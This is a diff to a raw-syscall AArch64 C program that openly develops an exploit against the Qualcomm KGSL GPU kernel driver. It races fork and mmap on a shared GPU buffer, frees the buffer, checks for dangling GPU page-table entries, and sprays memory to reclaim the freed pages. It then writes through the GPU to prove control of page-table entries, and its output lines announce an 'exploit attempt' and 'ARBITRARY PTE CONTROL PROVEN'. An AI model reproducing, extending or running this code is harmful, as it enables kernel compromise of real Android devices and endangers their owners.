@@ -17,6 +17,7 @@ typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; t
 #define SYS_munmap 215
 #define SYS_wait4 260
 #define SYS_sched_yield 124
+#define SYS_read 63
 static inline s64 sys1(long n,s64 a){register s64 x0 __asm__("x0")=a;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x8):"memory");return x0;}
 static inline s64 sys2(long n,s64 a,s64 b){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x8):"memory");return x0;}
 static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
@@ -26,6 +27,20 @@ static int slen(const char*s){int n=0;while(s[n])n++;return n;}
 static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
 static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
 static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
+static u64 memfree_kb(void){
+    s64 fd=sys4(SYS_openat,-100,(s64)"/proc/meminfo",0,0);
+    if(fd<0) return 0;
+    static char buf[2048]; s64 n=sys3(SYS_read,fd,(s64)buf,2047);
+    sys1(SYS_close,fd);
+    if(n<=0) return 0; buf[n]=0;
+    const char*k="MemFree:"; int i=0,j=0;
+    while(buf[i]){
+        if(buf[i]==k[j]){ j++; if(k[j]==0){ i++; while(buf[i]==' ')i++; u64 v=0; while(buf[i]>='0'&&buf[i]<='9'){v=v*10+(u64)(buf[i]-'0');i++;} return v; } }
+        else j=(buf[i]==k[0])?1:0;
+        i++;
+    }
+    return 0;
+}
 #define _IOC_WRITE 1u
 #define _IOC_READ 2u
 #define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
@@ -67,6 +82,8 @@ static u32 g_ts=1;
 static u32 g_bids[MAXB]; static u32*g_bcpu[MAXB]; static u64 g_bgpu[MAXB]; static int g_nb;
 static u64 g_regs[4096];
 static u32 g_hold[4096]; static int g_hold_n;
+static u64 g_hoglen;
+static int g_round;
 #define REGIONS 1024
 
 static long alloc_buf(u64 size,u32 flags,u32*id,u64*gpu,u32**cpu){
@@ -105,6 +122,7 @@ static __attribute__((naked)) long raw_fork(void){
 void child_entry(void){
     g_shm[0]=1;
     while(g_shm[1]==0){}
+    { int cd=0; for(int q=0;q<cd;q++) asm volatile("nop"); }
     s64 m=sys6(SYS_mmap,(s64)g_h3,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
     g_shm[2]=(u64)m;
     sys1(SYS_exit,0);
@@ -136,7 +154,9 @@ static int probe_mask(int i,u64 addr,u32 ref,u32 mask,int iters){
     struct kgsl_gpu_command gc; for(u64 q=0;q<sizeof(gc);q++)((u8*)&gc)[q]=0;
     gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=g_ctx[i].id; gc.timestamp=++g_ts;
     long r=sys3(SYS_ioctl,g_fd,IOCTL_GPU_COMMAND,(s64)&gc);
-    if(r) return -1;
+    if(r){ make_ctx(i); gc.context_id=g_ctx[i].id; gc.timestamp=++g_ts;
+        r=sys3(SYS_ioctl,g_fd,IOCTL_GPU_COMMAND,(s64)&gc);
+        if(r) return -1; }
     for(int q=0;q<iters;q++){ dc_civac(g_out,64); if(g_out[i]==(0x600D0000u+(u32)i)) return 1; sys3(SYS_sched_yield,0,0,0); }
     return 0;
 }
@@ -164,6 +184,16 @@ void _start(void){
     if(alloc_buf(0x1000,0,&g_cmdid,&g_cmd_gpu,&g_cmd)){out("[!] cmd\n");sys3(SYS_exit,1,0,0);return;}
     if(alloc_buf(0x1000,0,&g_outid,&g_out_gpu,&g_out)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
     for(int i=0;i<64;i++) g_out[i]=0; dc_civac(g_out,256);
+    { u32 cid; u64 cgpu; u32*ccp;
+      if(alloc_buf(0x1000,0,&cid,&cgpu,&ccp)==0){
+          ccp[0x40]=0xDEADB003u; dc_civac(ccp,0x1000);
+          int pc=probe_mask(0,cgpu+0x100,0x3,0x3,300);
+          int pc2=probe_mask(1,cgpu+0x100,0x3,0x1,300);
+          out("[0] oracle low2=");outdec(pc);out(" low1=");outdec(pc2);out("\n");
+          struct kgsl_gpumem_free_id cf; cf.id=cid; cf.pad=0;
+          sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&cf);
+      }
+    }
 
     int wins=0;
     for(int round=1; round<=ROUNDS; round++){
@@ -177,12 +207,14 @@ void _start(void){
         sys2(SYS_munmap,(s64)(g_h1+0x1000),0x1000);
         sys2(SYS_munmap,(s64)(g_h1+0x2000),(s64)(g_fsz-0x2000));
 
+        g_round=round;
         g_shm=(volatile u64*)sys6(SYS_mmap,0,0x1000,3,0x21,-1,0);
         g_shm[0]=0; g_shm[1]=0; g_shm[2]=0;
         long pid=raw_fork();
         if(pid>0){
             while(g_shm[0]==0){}
             g_shm[1]=1;
+            { int py=(g_round%16); for(int dq=0;dq<py;dq++) sys3(SYS_sched_yield,0,0,0); }
             g_p_res=sys6(SYS_mmap,(s64)g_h2,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
             sys4(SYS_wait4,pid,0,0,0);
             g_c_res=(s64)g_shm[2];
@@ -196,41 +228,55 @@ void _start(void){
                 out("[R");outdec(round);out("] MIXED parent=");outhex((u64)g_p_res);out(" child=");outhex((u64)g_c_res);out("\n");
                 if(g_c_res>0){
                     u64 surv=(u64)g_c_res;
+                    if(memfree_kb()<20000){ out("[R");outdec(round);out("] low mem - skip attempt\n"); continue; }
                     gpu_write(2,surv+0x100,0xDEADBEEFu);
-                    g_hold_n=0;
-                    for(int q=0;q<512;q++){ u32 hid; u64 hgpu; u32*hcp;
-                        if(alloc_buf(ASZ,0,&hid,&hgpu,&hcp)) break;
-                        if(g_hold_n<4096) g_hold[g_hold_n++]=hid;
-                    }
-                    out("[R");outdec(round);out("] pool pre-drain hold=");outdec(g_hold_n);out("\n");
                     sys2(SYS_munmap,(s64)g_h1,0x1000);
                     struct kgsl_gpumem_free_id f3; f3.id=g_aid; f3.pad=0;
                     long fr3=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f3);
                     out("[R");outdec(round);out("] destroy free_id rc=");outdec(fr3);out("\n");
-                    make_ctx(0);
-                    int alive_chk=probe_mask(0,surv+0x100,0xDEADBEEFu,0xFFFFFFFFu,600);
-                    out("[R");outdec(round);out("] post-destroy dangling check=");outdec(alive_chk);out("\n");
-                    if(alive_chk!=1){
-                        out("[R");outdec(round);out("] flavor a (PTEs unmapped at destroy) - skip\n");
-                        continue;
+                    int nr=0; int pteoff=-1;
+                    { s64 r0=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
+                      if(r0>0){
+                          ((volatile u32*)r0)[0]=0x4D414700u;
+                          ((volatile u32*)(r0+0x1000))[0]=0x4D414900u;
+                          g_regs[nr++]=(u64)r0;
+                          for(int o=0;o<1;o++){
+                              int c=probe_mask(o,(u64)surv+(u64)o*0x1000,0x3,0x3,200);
+                              out("[R");outdec(round);out("] first pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
+                              if(c==1){ pteoff=o; break; }
+                          }
+                      } else out("[R");outdec(round);out("] first region mmap failed\n");
                     }
-                    for(int sp=0;sp<200;sp++) sys3(SYS_sched_yield,0,0,0);
-                    out("[R");outdec(round);out("] settle done\n");
-                    int nr=0;
-                    for(int q=0;q<REGIONS;q++){
-                        s64 r=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
-                        if(r<=0) break;
-                        ((volatile u32*)r)[0]=0x4D414700u+(u32)q;
-                        ((volatile u32*)(r+0x1000))[0]=0x4D414900u+(u32)q;
-                        if(nr<4096) g_regs[nr++]=(u64)r;
-                    }
-                    out("[R");outdec(round);out("] sprayed ");outdec(nr);out(" x 2MB regions\n");
-                    int pteoff=-1;
-                    for(int o=0;o<3;o++){
-                        make_ctx(o);
-                        int c=probe_mask(o,(u64)surv+(u64)o*0x1000,0x3,0x3,600);
-                        out("[R");outdec(round);out("] offset ");outdec(o*0x1000);out(" pte-like=");outdec(c);out("\n");
-                        if(c==1){ pteoff=o; break; }
+                    if(pteoff<0){
+                        { int ac=probe_mask(0,surv+0x100,0xDEADBEEFu,0xFFFFFFFFu,400);
+                          out("[R");outdec(round);out("] dangling check=");outdec(ac);out("\n");
+                          if(ac!=1){ out("[R");outdec(round);out("] flavor a (PTEs unmapped at destroy) - skip\n");
+                              for(int q=0;q<nr;q++) sys2(SYS_munmap,(s64)g_regs[q],0x200000);
+                              nr=0; continue; }
+                        }
+                        { u32 kid; u64 kgpu; u32*kcp;
+                          if(alloc_buf(ASZ,0,&kid,&kgpu,&kcp)==0){
+                              for(u64 q=0;q<ASZ/4;q++) kcp[q]=0xB6B6B6B6u; dc_civac(kcp,ASZ);
+                              int pk=probe_mask(1,surv+0x100,0xB6B6B6B6u,0xFFFFFFFFu,400);
+                              out("[R");outdec(round);out("] holder check=");outdec(pk);out(pk==1?"  (buddy LIFO works)\n":"  (stolen)\n");
+                              struct kgsl_gpumem_free_id kf; kf.id=kid; kf.pad=0;
+                              sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&kf);
+                          }
+                        }
+                        for(int w=0;w<4 && pteoff<0;w++){
+                            for(int q=0;q<256;q++){
+                                s64 r=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
+                                if(r<=0) break;
+                                ((volatile u32*)r)[0]=0x4D414700u+(u32)q;
+                                ((volatile u32*)(r+0x1000))[0]=0x4D414900u+(u32)q;
+                                if(nr<4096) g_regs[nr++]=(u64)r;
+                            }
+                            for(int o=0;o<3;o++){
+                                int c=probe_mask(o,(u64)surv+(u64)o*0x1000,0x3,0x3,150);
+                                if(c==1){ pteoff=o; break; }
+                            }
+                            out("[R");outdec(round);out("] wave ");outdec(w);out(" regions=");outdec(nr);out(" pteoff=");outdec(pteoff);out("\n");
+                        }
                     }
                     if(pteoff>=0){
                         u64 base=(u64)surv+(u64)pteoff*0x1000;
@@ -254,11 +300,14 @@ void _start(void){
                             for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
                             if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
                         }
-                        make_ctx(1);
                         int ra=probe(1,surv+0x100,0xB6B6B6B6u);
                         out("[R");outdec(round);out("] KGSL reclaim probe=");outdec(ra);
-                        out(ra==1?"  (PTEs live; pages pooled not buddy)\n":"  (PTEs gone or unreclaimed)\n");
+                        out(ra==1?"  (PTEs live; page taken by KGSL spray)\n":"  (PTEs gone or unreclaimed)\n");
                     }
+                    for(int q=0;q<nr;q++) sys2(SYS_munmap,(s64)g_regs[q],0x200000);
+                    for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
+                    out("[R");outdec(round);out("] cleanup regions=");outdec(nr);out(" bufs=");outdec(g_nb);out("\n");
+                    nr=0; g_nb=0;
                     continue;
                 }
                 /* parent survivor: child's failed mmap; survivor mapping intact */
@@ -268,10 +317,66 @@ void _start(void){
                     int sv=probe(0,(u64)g_p_res+0x100,0xA5A5A5A5u);
                     out("[R");outdec(round);out("] survivor GPU probe=");outdec(sv);out(sv==0?"  <== SURVIVOR GPU MAPPING DESTROYED\n":"  (survivor mapping intact)\n");
                     sys2(SYS_munmap,(s64)g_p_res,g_fsz);
+                    sys2(SYS_munmap,(s64)g_h1,0x1000);
+                    struct kgsl_gpumem_free_id f4; f4.id=g_aid; f4.pad=0;
+                    sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f4);
+                    int dang=probe_mask(1,(u64)g_p_res+0x100,0xA5A5A5A5u,0xFFFFFFFFu,300);
+                    out("[R");outdec(round);out("] post-destroy dangling=");outdec(dang);out("\n");
+                    if(dang==1){
+                        out("[R");outdec(round);out("] DANGLING PTE + PAGES FREED - exploit attempt\n");
+                        int nr2=0; int po2=-1;
+                        s64 r0=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
+                        if(r0>0){
+                            ((volatile u32*)r0)[0]=0x4D414700u;
+                            ((volatile u32*)(r0+0x1000))[0]=0x4D414900u;
+                            g_regs[nr2++]=(u64)r0;
+                            for(int o=0;o<3;o++){
+                                int c=probe_mask(o,(u64)g_p_res+(u64)o*0x1000,0x3,0x3,200);
+                                out("[R");outdec(round);out("] pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
+                                if(c==1){ po2=o; break; }
+                            }
+                        } else out("[R");outdec(round);out("] first region mmap failed\n");
+                        if(po2>=0){
+                            u64 base=(u64)g_p_res+(u64)po2*0x1000;
+                            u32 pte0=read_dword(3,base,400);
+                            out("[R");outdec(round);out("] PTE#0=");outhex(pte0);out("\n");
+                            int ww=gpu_write(2,base+8,pte0);
+                            out("[R");outdec(round);out("] wrote PTE#0 rc=");outdec(ww);out("\n");
+                            int hit=-1; u32 hv=0;
+                            for(int q=0;q<nr2;q++){ u32 v=((volatile u32*)(g_regs[q]+0x1000))[0];
+                                if((v & 0xFFFFFF00u)==0x4D414700u){ hit=q; hv=v; break; } }
+                            out("[R");outdec(round);out("] PTE WRITE EFFECT region=");outdec(hit);
+                            if(hit>=0){ out(" page1=");outhex(hv);out("  <== ARBITRARY PTE CONTROL PROVEN\n"); break; }
+                            else out("  (no effect)\n");
+                        } else {
+                            g_nb=0;
+                            for(int q=0;q<512;q++){ u32 id; u64 gpu; u32*cp;
+                                if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
+                                for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
+                                if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
+                            }
+                            int ra=probe(1,(u64)g_p_res+0x100,0xB6B6B6B6u);
+                            out("[R");outdec(round);out("] KGSL reclaim=");outdec(ra);
+                            if(ra==1){
+                                int w2=gpu_write(2,(u64)g_p_res+0x100,0xCAFEF00Du);
+                                int found=-1;
+                                for(int q=0;q<g_nb;q++){ u32*p=g_bcpu[q];
+                                    for(u64 w3=0;w3<ASZ/4;w3++){ if(p[w3]==0xCAFEF00Du){ found=q; break; } }
+                                    if(found>=0) break; }
+                                out(" gpu_write=");outdec(w2);out(" alias buf=");outdec(found);
+                                out(found>=0?"  <== GPU WRITE INTO RECLAIMED PAGE\n":"\n");
+                            } else out("\n");
+                        }
+                        for(int q=0;q<nr2;q++) sys2(SYS_munmap,(s64)g_regs[q],0x200000);
+                        for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
+                        g_nb=0;
+                        continue;
+                    }
+                    continue;
                 }
                 sys2(SYS_munmap,(s64)g_h1,0x1000);
-                struct kgsl_gpumem_free_id f4; f4.id=g_aid; f4.pad=0;
-                sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f4);
+                struct kgsl_gpumem_free_id f4b; f4b.id=g_aid; f4b.pad=0;
+                sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f4b);
                 continue;
             }
             if(g_p_res>0) sys2(SYS_munmap,(s64)g_p_res,g_fsz);
